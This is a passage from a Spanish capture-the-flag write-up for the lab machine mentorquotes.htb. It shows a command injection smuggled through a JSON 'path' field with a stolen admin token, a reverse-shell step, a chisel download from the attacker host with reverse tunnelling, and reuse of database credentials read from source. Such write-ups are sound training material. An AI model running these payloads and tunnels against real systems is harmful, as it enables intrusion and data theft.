+Cambiando el método a POST</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>  <span style="color:#0ff;font-weight:bold">&#34;detail&#34;</span>: [
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>    {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>      <span style="color:#0ff;font-weight:bold">&#34;loc&#34;</span>: [
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>        <span style="color:#0ff;font-weight:bold">&#34;body&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>      ],
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>      <span style="color:#0ff;font-weight:bold">&#34;msg&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;field required&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>      <span style="color:#0ff;font-weight:bold">&#34;type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;value_error.missing&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>  ]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>}</span></span></code></pre></div>
+<p>Añadiendo el encabezado <code>Content-Type: application/json</code> y el parámetro <code>--data '{}'</code> (vacío) para poder enumerar que campos necesito rellenar, nos reporta lo siguiente.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>  <span style="font-weight:bold">&#34;detail&#34;</span>: [
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>    {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>      <span style="font-weight:bold">&#34;loc&#34;</span>: [
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>        <span style="color:#0ff;font-weight:bold">&#34;body&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>        <span style="color:#0ff;font-weight:bold">&#34;path&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>      ],
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>      <span style="font-weight:bold">&#34;msg&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;field required&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>      <span style="font-weight:bold">&#34;type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;value_error.missing&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>  ]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>}</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s -X POST http://api.mentorquotes.htb/admin/backup -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> -H <span style="color:#0ff;font-weight:bold">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#0ff;font-weight:bold">&#39;{&#34;path&#34;: &#34;test&#34;}&#39;</span>| jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;INFO&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Done!&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>}</span></span></code></pre></div>
+<p>¿Done?</p>
+<h1 id="rce">RCE</h1>
+<p>Después de probar un rato, supuse que estaba con tar, zip, 7z&hellip; lo que sea, ejecutando un comando a nivel de sistema donde se está pasando mi input, por lo cual, intenté ejecutar un comando.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s -X POST http://api.mentorquotes.htb/admin/backup -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> -H <span style="color:#0ff;font-weight:bold">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#0ff;font-weight:bold">&#39;{&#34;path&#34;: &#34;asd; ping -c 1 10.10.14.80 #&#34;}&#39;</span>| jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;INFO&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Done!&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>}</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo tcpdump icmp -i tun0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>tcpdump: verbose output suppressed, use -v[v]... <span style="color:#fff;font-weight:bold">for</span> full protocol decode
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>listening on tun0, link-type RAW (Raw IP), snapshot length <span style="color:#ff0;font-weight:bold">262144</span> bytes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>23:40:50.193172 IP api.mentorquotes.htb &gt; 10.10.14.80: ICMP <span style="color:#fff;font-weight:bold">echo</span> request, id 6400, seq 0, length <span style="color:#ff0;font-weight:bold">64</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>23:40:50.193200 IP 10.10.14.80 &gt; api.mentorquotes.htb: ICMP <span style="color:#fff;font-weight:bold">echo</span> reply, id 6400, seq 0, length <span style="color:#ff0;font-weight:bold">64</span></span></span></code></pre></div>
+<p>Ahora solo queda mandarnos la reverse shell.
+Después de probar los métodos comunes no pude mandar la revshell.
+Así que como la máquina estaba corriendo <code>Flask</code> sabemos que tiene python, así que probé a mandarme la revshell con python.</p>
+<p>Tuve que pasarme a <code>burpsuite</code> para escapar los caracteres correctamente, además, como es un contenedor, hay que mandar una <code>sh</code> y no una <code>bash</code>
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Podemos ver que hemos ganado acceso al contenedor</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>ip a
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ff0;font-weight:bold">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ff0;font-weight:bold">1000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>11: eth0@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style="color:#ff0;font-weight:bold">1500</span> qdisc noqueue state UP
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>    link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>       valid_lft forever preferred_lft forever</span></span></code></pre></div>
+<p>La flag se encuentra en este contenedor
+<code>/home/svc/user.txt</code></p>
+<h1 id="escaping-the-container">Escaping the container</h1>
+<p>Me importa el archivo <code>db.py</code> de la aplicación ya que contiene credenciales de la base de datos.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">import</span> os
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#fff;font-weight:bold">from</span> sqlalchemy <span style="color:#fff;font-weight:bold">import</span> (Column, DateTime, Integer, String, Table, create_engine, MetaData)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#fff;font-weight:bold">from</span> sqlalchemy.sql <span style="color:#fff;font-weight:bold">import</span> func
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#fff;font-weight:bold">from</span> databases <span style="color:#fff;font-weight:bold">import</span> Database
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#007f7f"># Database url if none is passed the default one is used</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>DATABASE_URL = os.getenv(<span style="color:#0ff;font-weight:bold">&#34;DATABASE_URL&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#007f7f"># SQLAlchemy for quotes</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>engine = create_engine(DATABASE_URL)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>metadata = MetaData()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>quotes = Table(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>    <span style="color:#0ff;font-weight:bold">&#34;quotes&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>    metadata,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>    Column(<span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>, Integer, primary_key=<span style="color:#fff;font-weight:bold">True</span>),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>    Column(<span style="color:#0ff;font-weight:bold">&#34;title&#34;</span>, String(<span style="color:#ff0;font-weight:bold">50</span>)),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>    Column(<span style="color:#0ff;font-weight:bold">&#34;description&#34;</span>, String(<span style="color:#ff0;font-weight:bold">50</span>)),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>    Column(<span style="color:#0ff;font-weight:bold">&#34;created_date&#34;</span>, DateTime, default=func.now(), nullable=<span style="color:#fff;font-weight:bold">False</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span><span style="color:#007f7f"># SQLAlchemy for users</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>engine = create_engine(DATABASE_URL)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>metadata = MetaData()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>users = Table(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>    <span style="color:#0ff;font-weight:bold">&#34;users&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>    metadata,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>    Column(<span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>, Integer, primary_key=<span style="color:#fff;font-weight:bold">True</span>),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>    Column(<span style="color:#0ff;font-weight:bold">&#34;email&#34;</span>, String(<span style="color:#ff0;font-weight:bold">50</span>)),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>    Column(<span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>, String(<span style="color:#ff0;font-weight:bold">50</span>)),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>    Column(<span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>, String(<span style="color:#ff0;font-weight:bold">128</span>) ,nullable=<span style="color:#fff;font-weight:bold">False</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span><span style="color:#007f7f"># Databases query builder</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>database = Database(DATABASE_URL)</span></span></code></pre></div>
+<p>Pero nos damos cuenta de que la BBDD está en otro equipo. Pero con chisel podemos hacer port-forwarding fácilmente.</p>
+<p>Me descargo el chisel en la máquina víctima</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>wget http://10.10.14.80:8081/chisel -O chisel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Connecting to 10.10.14.80:8081 (10.10.14.80:8081)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>chisel               100% |********************************| 8452k  0:00:00 ETA</span></span></code></pre></div>
+<p>Atacante</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ /opt/chisel/chisel server --reverse -p <span style="color:#ff0;font-weight:bold">1234</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>2024/08/02 00:03:21 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>2024/08/02 00:03:21 server: Fingerprint XmJE32+0pB6QL7Qz0TxHillBb6Cs7f7sLF6uTMD4MnA=
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>2024/08/02 00:03:21 server: Listening on http://0.0.0.0:1234
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>2024/08/02 00:04:07 server: session#1: tun: proxy#R:5432=&gt;172.22.0.1:5432: Listening</span></span></code></pre></div>
+<p>Máquina víctima</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>./chisel client 10.10.14.80:1234 R:5432:172.22.0.1:5432
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>2024/08/01 20:04:27 client: Connecting to ws://10.10.14.80:1234
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>2024/08/01 20:04:27 client: Connected (Latency 37.887855ms)</span></span></code></pre></div>
+<p>Ahora en principio mi puerto local 5432 corresponde al puerto 5432 del equipo <code>172.22.0.1</code></p>
+<p>Lo podemos comprobar..</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ nmap -p5432 127.0.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 00:05 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> localhost (127.0.0.1)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Host is up (0.00019s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>5432/tcp open  postgresql</span></span></code></pre></div>
+<h2 id="enumerating-database">Enumerating Database</h2>
+<p>He utilizado <code>sshpass</code> para poner la contraseña de la base de datos rápidamente y así saltarme el prompt de la contraseña..</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sshpass -p postgres psql -h 127.0.0.1 -U postgres -W postgres -p <span style="color:#ff0;font-weight:bold">5432</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>psql (15.7 (Debian 15.7-0+deb12u1), server 13.7 (Debian 13.7-1.pgdg110+1))
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Type <span style="color:#0ff;font-weight:bold">&#34;help&#34;</span> <span style="color:#fff;font-weight:bold">for</span> help.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>postgres=<span style="color:#007f7f">#</span></span></span></code></pre></div>
+<p>con <code>\list</code> detectamos una base de datos llamada <code>mentorquotes_db</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>postgres=<span style="color:#007f7f"># \c mentorquotes_db</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Password:
